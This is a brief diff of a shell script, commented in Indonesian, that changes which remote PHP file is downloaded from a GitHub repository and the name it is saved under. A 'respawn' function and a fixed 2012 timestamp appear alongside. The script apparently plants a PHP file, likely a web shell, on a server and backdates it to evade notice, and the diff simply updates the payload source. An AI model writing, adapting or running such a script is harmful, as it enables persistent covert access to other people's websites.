@@ -41,8 +41,8 @@ respawn() {
 }
 
 # URL sumber file yang akan diunduh
-url="https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/alpha-wp.php"
-file_name="gold.php"
+url="https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/gecko.php"
+file_name="gold-empire.php"
 timestamp="201201081531.12"
 
 # Jalankan fungsi penting
